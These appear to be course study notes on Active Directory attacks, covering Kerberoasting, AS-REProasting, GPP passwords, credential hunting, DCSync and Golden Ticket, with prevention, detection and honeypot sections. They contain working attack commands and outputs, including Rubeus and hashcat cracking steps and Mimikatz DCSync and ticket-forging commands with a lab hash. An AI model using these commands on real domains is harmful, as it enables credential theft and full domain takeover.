See Active Directory module

# Kerberoasting 

In Active Directory, a [Service Principal Name (SPN)](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) is a unique service instance identifier. Kerberos uses `SPNs` for authentication to associate a service instance with a service logon account, which allows a client application to request that the service authenticate an account even if the client does not have the account name. When a Kerberos `TGS` service ticket is asked for, it gets encrypted with the service account's NTLM password hash.

Kerberoasting is a post-exploitation attack that attempts to exploit this behavior by obtaining a ticket and performing offline password cracking to open the ticket. If the ticket opens, then the candidate password that opened the ticket is the service account's password. The success of this attack depends on the strength of the service account's password. Another factor that has some impact is the encryption algorithm used when the ticket is created, with the likely options being:

- `AES`
- `RC4`
- `DES` (found in environments that are 15+ old years old with legacy apps from the early 2000s, otherwise, this will be disabled)

There is a significant difference in the cracking speed between these three, as `AES` is slower to crack than the others. While security best practices recommend disabling `RC4` (and `DES`, if enabled for some reason), most environments do not. The caveat is that not all application vendors have migrated to support `AES` (most but not all). By default, the ticket created by the `KDC` will be one with the most robust/highest encryption algorithm supported. However, attackers can `force a downgrade` back to `RC4`.

## the Attack

From an AD User:
```PowerShell
.\Rubeus.exe kerberoast /outfile:spn.txt
```

from anywhere using one of the kerberoasted users's full hash line:
```bash
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
```
Or
```bash
sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
```

## Prevention

Impose 100+ random characters (127 being the maximum allowed in AD) to ensure cracking is impossible. Best practise is [Group Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), supported mainly by Microsoft Services (eg `IIS` and `SQL`).

## Detection

Find event log `4769` (`TGS` request) with `Ticket Encryption Type` -> `0x17`, aka `RC4`.

## Honeypot

A honeypot user is a perfect detection option to configure in an AD environment; this must be a user with no real use/need in the environment, so no service tickets are generated regularly. In this case, any attempt to generate a service ticket for this account is likely malicious and worth inspecting. There are a few things to ensure when using this account:

- The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).
- The password should not have been changed recently. A good target is 2+ years, ideally five or more. But the password must be strong enough that the threat agents cannot crack it.
- The account must have some privileges assigned to it; otherwise, obtaining a ticket for it won't be of interest (assuming that an advanced adversary obtains tickets only for interesting accounts/higher likelihood of cracking, e.g., due to an old password).
- The account must have an SPN registered, which appears legit. IIS and SQL accounts are good options because they are prevalent.

# AS-REProasting

The `AS-REProasting` attack is similar to the `Kerberoasting` attack; we can obtain crackable hashes for user accounts that have the property `Do not require Kerberos preauthentication` enabled. The success of this attack depends on the strength of the user account password that we will crack.

## The Attack

From Ad user:
```Powershell
.\Rubeus.exe asreproast /outfile:asrep.txt
```

For hashcat to be able to recognize the hash, we need to edit it by adding 23$ after $krb5asrep$, eg:
`$krb5asrep$23$anni@eagle.local:1b912b858c4551c001...`

```bash
sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
```
Add `--force` if hashcar shown an error.

You'll know you succeded when you see the line
```
Status..........: Cracked
```

## Prevention

As mentioned before, the success of this attack depends on the strength of the password of users with Do not require Kerberos preauthentication configured.

First and foremost, we should only use this property if needed; a good practice is to review accounts quarterly to ensure that we have not assigned this property. Because this property is often found with some regular user accounts, they tend to have easier-to-crack passwords than service accounts with SPNs (those from Kerberoast). Therefore, for users requiring this configured, we should assign a separate password policy, which requires at least 20 characters to thwart cracking attempts.

## Detection

Look for event ID `4768`, signaling that a `Kerberos Athentification ticket` was generated.

The only way to find this is to correlate the Client Address (IP) with it's know usual IP address or look for this request from compromised hosts.

## Honeypot

For this attack, a `honeypot user` is an excellent detection option to configure in AD environments; this must be a user with no real use/need in the environment, such that no login attempts are performed regularly. Therefore, any attempt(s) to perform a login for this account is likely malicious and requires inspection.

To make a good honeypot user, we should ensure the following:

- The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).
- For a service account user, the password should ideally be over two years old. For regular users, maintain the password so it does not become older than one year.
- The account must have logins after the day the password was changed; otherwise, it becomes self-evident if the last password change day is the same as the previous login.
- The account must have some privileges assigned to it; otherwise, it won't be interesting to try to crack its password's hash.

# GPP Passwords

`SYSVOL` is a network share on all Domain Controllers, containing logon scripts, group policy data, and other required domain-wide data. AD stores all group policies in `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`. When Microsoft released it with the Windows Server 2008, `Group Policy Preferences (GPP)` introduced the ability to store and use credentials in several scenarios, all of which AD stores in the policies directory in `SYSVOL`.

During engagements, we might encounter scheduled tasks and scripts executed under a particular user and contain the username and an encrypted version of the password in XML policy files. The encryption key that AD uses to encrypt the XML policy files (the `same` for all Active Directory environments) was released on Microsoft Docs, allowing anyone to decrypt credentials stored in the policy files. Anyone can decrypt the credentials because the `SYSVOL` folder is accessible to all 'Authenticated Users' in the domain, which includes users and computers. Microsoft published the [AES private key on MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN).

## The Attack

If needed, change execution policy:
```PowerShell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

Get the [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) function from `PowerSploit`, which automatically parses all XML files in the Policies folder in `SYSVOL`, picking up those with the `cpassword` property and decrypting them once detected.
```PowerShell
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
```

## Prevention

Once the encryption key was made public and started to become abused, Microsoft released a patch (`KB2962486`) in 2014 to prevent `caching credentials` in GPP. Therefore, GPP should no longer store passwords in new patched environments. However, unfortunately, there are a multitude of Active Directory environments built after 2015, which for some reason, do contain credentials in `SYSVOL`. It is therefore highly recommended to continuously assess and review the environment to ensure that no credentials are exposed here.

It is crucial to know that if an organization built its AD environment before 2014, it is likely that its credentials are still cached because the patch does not clear existing stored credentials (only prevents the caching of new ones).

## Detection

1. Accessing the XML file containing the credentials should be a red flag if we are auditing file access; this is more realistic (due to volume otherwise) regarding detection if it is a dummy XML file, not associated with any GPO. In this case, there will be no reason for anyone to touch this file, and any attempt is likely suspicious. As demonstrated by `Get-GPPPasswords`, it parses all of the XML files in the Policies folder. For auditing, we can generate an event whenever a user reads the file. Once auditing is enabled, any access to the file will generate an Event with the ID `4663`.


2. Logon attempts (failed or successful, depending on whether the password is up to date) of the user whose credentials are exposed is another way of detecting the abuse of this attack; this should generate one of the events 4624 (successful logon), `4625` (failed logon), or `4768` (TGT requested).In the case of a service account, we may correlate logon attempts with the device from which the authentication attempt originates, as this should be easy to detect, assuming we know where certain accounts are used (primarily if the logon originated from a workstation, which is abnormal behavior for a service account).

## Honeypot 

This attack provides an excellent opportunity for setting up a trap: we can use a semi-privileged user with a wrong password. Service accounts provide a more realistic opportunity because:

- The password is usually expected to be old, without recent or regular modifications.
- It is easy to ensure that the last password change is older than when the GPP XML file was last modified. If the user's password is changed after the file was modified, then no adversary will attempt to login with this account (the password is likely no longer valid).
- Schedule the user to perform any dummy task to ensure that there are recent logon attempts.

When we do the above, we can configure an alert that if any successful or failed logon attempts occur with this service account, it must be malicious (assuming that we whitelist the dummy task logon that simulates the logon activity in the alert).

Because the provided password is wrong, we would primarily expect failed logon attempts. Three event IDs (`4625`:`Account failed to log on`, `4771`:`Kerberos pre-athentification failed`, and `4776`:`this computer attempter to validate the credentials for an account`) can indicate this.

# GPO Permissions/GPO Files

A [Group Policy Object (GPO)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-objects) is a virtual collection of policy settings that has a unique name. `GPOs` are the most widely used configuration management tool in Active Directory. Each GPO contains a collection of zero or more policy settings. They are linked to an `Organizational Unit` in the AD structure for their settings to be applied to objects that reside in the OU or any child OU of the one to which the GPO is linked. GPOs can be restricted to which objects they apply by specifying, for example, an AD group (by default, it applies to Authenticated Users) or a WMI filter (e.g., apply only to Windows 10 machines).

When we create a new GPO, only Domain admins (and similar privileged roles) can modify it. However, within environments, we will encounter different delegations that allow less privileged accounts to perform edits on the GPOs; this is where the problem lies. Many organizations have GPOs that can modify 'Authenticated Users' or 'Domain Users', which entails that any compromised user will allow the attacker to alter these GPOs. Modifications can include additions of start-up scripts or a scheduled task to execute a file, for example. This access will allow an adversary to compromise all computer objects in the OUs that the vulnerable GPOs are linked to.

Similarly, administrators perform software installation via GPOs or configure start-up scripts located on `network shares`. If the `network share` is `misconfigured`, an adversary may be able to replace the file to be executed by the system with a malicious one. The GPO may have no misconfigurations in these scenarios, just misconfigured NTFS permissions on the files deployed.

## The Attack

No attack walkthrough is available here - it is a simple GPO edit or file replacement.

## Prevention

One way to prevent this attack is to lock down the GPO permissions to be modified by a particular group of users only or by a specific account, as this will significantly limit the ability of who can edit the GPO or change its permissions (as opposed to everybody in Domain admins, which in some organizations can easily be more than 50). Similarly, never deploy files stored in network locations so that many users can modify the share permissions.

We should also review the permissions of GPOs actively and regularly, with the option of automating a task that runs hourly and alerts if any deviations from the expected permissions are detected.

## Detection 

Fortunately, it is straightforward to detect when a GPO is modified. If Directory Service Changes auditing is enabled, then the event ID `5136` will be generated. This will show the `Account Name` that modified it, and the `GUID` value of the GPO modified. If a user who is `not` expected to have the right to modify a GPO suddenly appears here, then a red flag should be raised.

## Honeypot

A common thought is that because of the easy detection methods of these attacks, it is worth having a misconfigured GPO in the environment for threat agents to abuse; this is also true for a deployed file as they can be continuously monitored for any change to the file (e.g., constantly checking if the hash value of the file has not changed). However, implementing these techniques is only recommended if an organization is mature and proactive in responding to high/critical vulnerabilities; this is because if, in the future, an escalation path is discovered via some GPO modification, unless it is possible to mitigate it in real-time, the `trap` backfires to become the weakest point.

However, when implementing a honeypot using a misconfigured GPO, consider the following:

- GPO is linked to non-critical servers only.
- Continuous automation is in place for monitoring modifications of GPO. - - If the GPO file is modified, we will disable the user performing the modification immediately.
- The GPO should be automatically unlinked from all locations if a modification is detected.

Consider the following script to demonstrate how PowerShell can automate this. In our case, the honeypot GPO is identified by a GUID value, and the action desired is to disable the account(s) associated with this change. The reason for potentially multiple accounts is that we will execute the script every 15 minutes as a scheduled task. So, if numerous compromised users were used to modify the GPO in this time frame, we will disable them all instantly. The script has a commented-out section that can be used for sending an email as an alert, but for a PoC, we will display the output on the command line:

```PowerShell
# Define filter for the last 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)

# Search for event ID 5136 (GPO modified) in the past 15 minutes
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`
Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}


if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody = $emailBody + "Disabled user " + $log.Properties[3].Value + "`r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Send an alert via email - complete the command below
    # Send-MailMessage
    $emailBody
}
```

We will see the following output (or email body if configured) if the script detects that the honeypot GPO was modified:

```PowerShell
PS C:\scripts> # Define filter for the last 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)

# Search for event ID 5136 (GPO modified) in the past 15 minutes
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |`
Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}


if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified`r`n"
    $disabledUsers = @()
    ForEach($log in $logs){
        # Write-Host "User performing the modification is " $log.Properties[3].Value
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody = $emailBody + "Disabled user " + $log.Properties[3].Value + "`r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Send an alert via email
    # Send-MailMessage
    $emailBody
}

Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modified
Disabled user bob


PS C:\scripts> 
```

As we can see above, the user bob was detected modifying our honeypot GPO and is, therefore, disabled. Disabling the user will then create an event with ID `4725`:`A user account was disabled`.

# Credentials in Shares

Credentials exposed in network shares are (probably) the most encountered misconfiguration in Active Directory to date. Any medium/large enterprises will undoubtedly have exposed credentials, although it may also happen in small businesses. It almost feels like we are moving from "Don't leave your password on a post-it note on your screen" to "Don't leave unencrypted credentials and authorization tokens scattered everywhere".

We often find credentials in network shares within scripts and configuration files (batch, cmd, PowerShell, conf, ini, and config). In contrast, credentials on a user's local machine primarily reside in text files, Excel sheets, or Word documents. The main difference between the storage of credentials on shares and machines is that the former poses a significantly higher risk, as it may be accessible by every user. A network share may be accessible by every user for four main reasons:

- One admin user initially creates the shares with properly locked down access but ultimately opens it to everyone. Another admin of the server could also be the culprit. Nonetheless, the share eventually becomes open to `Everyone` or `Users`, and recall that a server's `Users` group contains `Domain users` as its member in Active Directory environments. Therefore every domain user will have at least read access (it is wrongly assumed that adding 'Users' will give access to only those local to the server or Administrators).
- The administrator adding scripts with credentials to a share is unaware it is a shared folder. Many admins test their scripts in a `scripts` folder in the `C:\` drive; however, if the folder is shared (for example, with `Users`), then the data within the scripts is also exposed on the network.
- Another example is purposely creating an open share to move data to a server (for example, an application or some other files) and forgetting to close it later.
- Finally, in the case of hidden shares (folders whose name ends with a dollar sign`$`), there is a misconception that users cannot find the folder unless they know where it exists; the misunderstanding comes from the fact that `Explorer` in Windows does not display files or folders whose name end with a $, however, any other tool will show it.

## The Attack

If needed, change execution policy:
```PowerShell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
```

Use powerview's (`Import-Module Powerview.ps1`) [Invoke-ShareFinder](https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1):
```PowerShell
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
```

You can explore the servers you find with the file explorer. It will also give you a prompt in case you haven't enabled network host discovery.

Say we find a share with the name `dev$`. Because of the dollar sign, if we were to browse the server which contains the share using Windows Explorer, we would be presented with an empty list (shares such as `C$` and `IPC$` even though available by default, Explorer does not display them because of the dollar sign).

A few automated tools exist, such as SauronEye, which can parse a collection of files and pick up matching words. However, because there are few shares in the playground, we will take a more manual approach (`Living Off the Land`) and use the built-in command findstr for this attack. When running findstr, we will specify the following arguments:

- `/s` forces to search the current directory and all subdirectories
- `/i` ignores case in the search term
- `/m` shows only the filename for a file that matches the term. We highly need this in real production environments because of the huge amounts of text that get returned. For example, this can be thousands of lines in PowerShell scripts that contain the `PassThru` parameter when matching for the string `pass`.
- The `term` that defines what we are looking for. Good candidates include `pass`, `pw`, and the `NETBIOS` name of the domain. In the playground environment, it is eagle. Attractive targets for this search would be file types such as `.bat`, `.cmd`, `.ps1`, `.conf`, `.config`, and `.ini`. Here's an example of how `findstr` can be executed to display the path of the files with a match that contains `pass` relative to the current location:

```PowerShell
PS C:\Users\bob\Downloads> cd \\Server01.eagle.local\dev$
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.bat
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.cmd
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.ini
setup.ini
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pass" *.config
4\5\4\web.config
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "pw" *.config
5\2\3\microsoft.config
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /s /i "pw" *.config
5\2\3\microsoft.config:pw BANANANANANANANANANANANANNAANANANANAS
```

One obvious and yet uncommon search term is the `NetBIOS` name of the domain. Commands such as `runas` and `net` take passwords as a positional argument on the command line instead of passing them via `pass`, `pw`, or any other term. It is usually defined as `/user:DOMAIN\USERNAME PASSWORD`. 

```PowerShell
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /m /s /i "eagle" *.ps1

2\4\4\Software\connect.ps1
PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$> findstr /s /i "eagle" *.ps1
2\4\4\Software\connect.ps1:net use E: \\DC1\sharedScripts /user:eagle\Administrator Slavi123
```

## Prevention

The best practice to prevent these attacks is to lock down every share in the domain so there are no loose permissions.

Technically, there is no way to prevent what users leave behind them in scripts or other exposed files, so performing regular scans (e.g., weekly) on AD environments to identify any new open shares or credentials exposed in older ones is necessary.

## Detection

Understanding and analyzing users' behavior is the best detection technique for abusing discovered credentials in shares. Suppose we know the time and location of users' login via data analysis. In that case, it will be effortless to alert on seemingly suspicious behaviors—for example, the discovered account 'Administrator' in the attack described above. If we were a mature organization that used `Privileged Access Workstation`, we would be alert to privileged users not authenticating from those machines. These would be alerts on event IDs `4624`/`4625` (failed and successful logon) and `4768` (Kerberos TGT requested).

Another detection technique is discovering the `one-to-many` connections, for example, when `Invoke-ShareFinder` scans every domain device to obtain a list of its network shares. It would be abnormal for a workstation to connect to 100s or even 1000s of other devices simultaneously.

## Honeypot

This attack provides another excellent reason for leaving a honeypot user in AD environments: a semi-privileged username with a `wrong` password. An adversary can only discover this if the password was changed after the file's last modification containing this exposed fake password. Below is a good setup for the account:

- A `service account` that was created 2+ years ago. The last password change should be at least one year ago.
- The last modification time of the file containing the `fake` password must be after the last password change of the account. Because it is a fake password, there is no risk of a threat agent compromising the account.
- The account is still active in the environment.
- The script containing the credentials should be realistic. (For example, if we choose an `MSSQL service account`, a `connection string` can expose the credentials.)

Because the provided password is wrong, we would primarily expect failed logon attempts. Three event IDs (`4625`, `4771`, and `4776`) can indicate this. 

# Credentials in Object Properties

Objects in Active Directory have a plethora of different properties; for example, a user object can contain properties that contain information such as:

- Is the account active
- When does the account expire
- When was the last password change
- What is the name of the account
- Office location for the employee and phone number

When administrators create accounts, they fill in those properties. A common practice in the past was to add the user's (or service account's) password in the `Description` or `Info` properties, thinking that administrative rights in AD are needed to view these properties. However, `every` domain user can read most properties of an object (including `Description` and `Info`).

## The Attack

```PowerShell
Function SearchUserClearTextInformation
{
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms)
    {
        $list += "(`$_.Description -like `"*$t*`")"
        $list += "(`$_.Info -like `"*$t*`")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}

SearchUserClearTextInformation -Terms "pass"
```

## Prevention

We have many options to prevent this attack/misconfiguration:

- Perform continuous assessments to detect the problem of storing credentials in properties of objects.
- Educate employees with high privileges to avoid storing credentials in properties of objects.
- Automate as much as possible of the user creation process to ensure that administrators don't handle the accounts manually, reducing the risk of introducing hardcoded credentials in user objects.

## Detection

Baselining users' behavior is the best technique for detecting abuse of exposed credentials in properties of objects. Although this can be tricky for regular user accounts, triggering an alert for administrators/service accounts whose behavior can be understood and baselined is easier. Automated tools that monitor user behavior have shown increased success in detecting abnormal logons. In the example above, assuming that the provided credentials are up to date, we would expect events with event ID `4624`/`4625` (failed and successful logon) and `4768` (Kerberos TGT requested). Below is an example of event ID `4768`.

Unfortunately, the event ID `4738` generated when a user object is modified does not show the specific property that was altered, nor does it provide the new values of properties. Therefore, we cannot use this event to detect if administrators add credentials to the properties of objects.

## Honeypot

Storing credentials in properties of objects is an excellent honeypot technique for not-very-mature environments. If struggling with basic cyber hygiene, then it is more likely expected to have such issues (storing credentials in properties of objects) in an AD environment. For setting up a honeypot user, we need to ensure the followings:

- The password/credential is configured in the `Description` field, as it's the easiest to pick up by any adversary.
- The provided password is fake/incorrect.
- The account is enabled and has recent login attempts.
- While we can use a regular user or a service account, service accounts are more likely to have this exposed as administrators tend to create them manually. In contrast, automated HR systems often make employee accounts (and the employees have likely changed the password already).
- The account has the last password configured 2+ years ago (makes it more believable that the password will likely work).

Because the provided password is wrong, we would primarily expect failed logon attempts; three event IDs (`4625`, `4771`, and `4776`) can indicate this.

# DCSync

DCSync is an attack that threat agents utilize to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:

- Replicating Directory Changes
- Replicating Directory Changes All

## The Attack

We can check in the `Active Directory User and Computers` Properties window. It's not immediately obvious how to check with the command line as `whoami /priv` priviledges are assigned at logon. you can check with `runas /user:domain_name\username cmd.exe`.

we need to use Mimikatz, one of the tools with an implementation for performing DCSync. We can run it by specifying the username whose password hash we want to obtain if the attack is successful, in this case, the user 'Administrator':

```cmd
C:\Mimikatz>mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator
```

## Prevention

What DCSync abuses is a common operation in Active Directory environments, as replications happen between Domain Controllers all the time; therefore, preventing DCSync out of the box is not an option. The only prevention technique against this attack is using solutions such as the [RPC Firewall](https://github.com/zeronetworks/rpcfirewall), a third-party product that can block or allow specific RPC calls with robust granularity. For example, using `RPC Firewall`, we can only allow replications from Domain Controllers.

## Detection

Detecting DCSync is easy because each Domain Controller replication generates an event with the ID `4662`. We can pick up abnormal requests immediately by monitoring for this event ID and checking whether the initiator account is a Domain Controller.

Since replications occur constantly, we can avoid false positives by ensuring the followings:

- Either the operation property `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` or `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` is present in the event.
- Whitelisting systems/accounts with a (valid) business reason for replicating, such as `Azure AD Connect` (this service constantly replicates Domain Controllers and sends the obtained password hashes to Azure AD).

# Kerberos Golden Ticket

The `Kerberos Golden Ticket` is an attack in which threat agents can create/generate tickets for any user in the Domain, therefore effectively acting as a Domain Controller.

When a Domain is created, the unique user account `krbtgt` is created by default; `krbtgt` is a disabled account that cannot be deleted, renamed, or enabled. The Domain Controller's KDC service will use the password of `krbtgt` to derive a key with which it signs all Kerberos tickets. This password's hash is the most trusted object in the entire Domain because it is how objects guarantee that the environment's Domain issued Kerberos tickets.

Therefore, `any user` possessing the password's hash of `krbtgt` can create valid Kerberos TGTs. Because `krbtgt` signs them, forged TGTs are considered valid tickets within an environment. Previously, it was even possible to create TGTs for inexistent users and assign any privileges to their accounts. Because the password's hash of `krbtgt` signs these tickets, the entire domain blindly trusts them, behaving as if the user(s) existed and possessed the privileges inscribed in the ticket.

The `Golden Ticket` attack allows us to escalate rights from any child domain to the parent in the same forest. Therefore, we can escalate to the production domain from any test domain we may have, as the domain is `not` a security boundary.

This attack provides means for elevated persistence in the domain. It occurs after an adversary has gained Domain Admin (or similar) privileges.

We will not look as the means by which this is done, only the `execution`.

## The Attack

To perform the `Golden Ticket` attack, we can use `Mimikatz` with the following arguments:

- `/domain`: The domain's name.
- `/sid`: The domain's SID value.
- `/rc4`: The password's hash of `krbtgt`.
- `/user`: The username for which `Mimikatz` will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.)
- `/id`: Relative ID (last part of `SID`) for the user for whom `Mimikatz` will issue the ticket.

Additionally, advanced threat agents mostly will specify values for the `/renewmax `and `/endin` arguments, as otherwise, Mimikatz will generate the ticket(s) with a lifetime of 10 years, making it very easy to detect by `EDRs`:

- `/renewmax`: The maximum number of days the ticket can be renewed.
- `/endin`: End-of-life for the ticket.

So first, we need to obtain the `password's hash of krbtgt` and the `SID value of the Domain`. We can utilize `DCSync` with Rocky's account from the previous attack to obtain the hash:

```PowerShell
C:\Mimikatz>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
[DC] 'eagle.local' will be the domain
[DC] 'DC1.eagle.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 07/08/2022 11.26.54
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: db0d0630064747072a7da3f7c3b4069e
<SNIP>
```

Next in any PowerShell for the `SID`:

```PS C:\Users\bob\Downloads> powershell -exec bypass

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\bob\Downloads> . .\PowerView.ps1
PS C:\Users\bob\Downloads> Get-DomainSID
S-1-5-21-1518138621-4282902758-752445584
```

Now, armed with all the required information, we can use `Mimikatz` to create a ticket for the account `Administrator`. The `/ptt` argument makes `Mimikatz` [pass the ticket into the current session](https://adsecurity.org/?page_id=1821#KERBEROSPTT):

```PowerShell
C:\Mimikatz>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

User      : Administrator
Domain    : eagle.local (EAGLE)
SID       : S-1-5-21-1518138621-4282902758-752445584
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: db0d0630064747072a7da3f7c3b4069e - rc4_hmac_nt
Lifetime  : 13/10/2022 06.28.43 ; 13/10/2022 06.36.43 ; 13/10/2022 06.35.43
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ eagle.local' successfully submitted for current session
```

We can verify `Mimikatz` injected the ticket to the cirrent sessions (`/ppt`) by running the command `klist`:
```PowerShell
C:\Mimikatz>klist

Current LogonId is 0:0x9cbd6

Cached Tickets: (1)

#0>     Client: Administrator @ eagle.local
        Server: krbtgt/eagle.local @ eagle.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 10/13/2022 13/10/2022 06.28.43 (local)
        End Time:   10/13/2022 13/10/2022 06.36.43 (local)
        Renew Time: 10/13/2022 13/10/2022 06.35.43 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

We are indeed `Administrator @ eagle.local`.

To verify that the ticket is working, we can list the content of the `C$` share of `DC1` (Admin share of the Domain Controller) using it:
```PowerShell
C:\Mimikatz>dir \\dc1\c$

 Volume in drive \\dc1\c$ has no label.
 Volume Serial Number is 2CD0-9665

 Directory of \\dc1\c$

15/10/2022  08.30    <DIR>          DFSReports
13/10/2022  13.23    <DIR>          Mimikatz
01/09/2022  11.49    <DIR>          PerfLogs
28/11/2022  01.59    <DIR>          Program Files
01/09/2022  04.02    <DIR>          Program Files (x86)
13/12/2022  02.22    <DIR>          scripts
07/08/2022  11.31    <DIR>          Users
28/11/2022  02.27    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  44.947.984.384 bytes free
```

## Prevention

Preventing the creation of forged tickets is difficult as the KDC generates valid tickets using the same procedure. Therefore, once an attacker has all the required information, they can forge a ticket. Nonetheless, there are a few things we can and should do:

- Block privileged users from authenticating to any device.
- Periodically reset the password of the `krbtgt` account; the secrecy of this hash value is crucial to Active Directory. When resetting the password of krbtgt (regardless of the password's strength), it will always be overwritten with a new randomly generated and cryptographically secure one. Utilizing Microsoft's script for changing the password of `krbtgt` [KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1) is highly recommended as it has an audit mode that checks the domain for preventing impacts upon password change. It also forces DC replication across the globe so all Domain Controllers sync the new value instantly, reducing potential business disruptions.
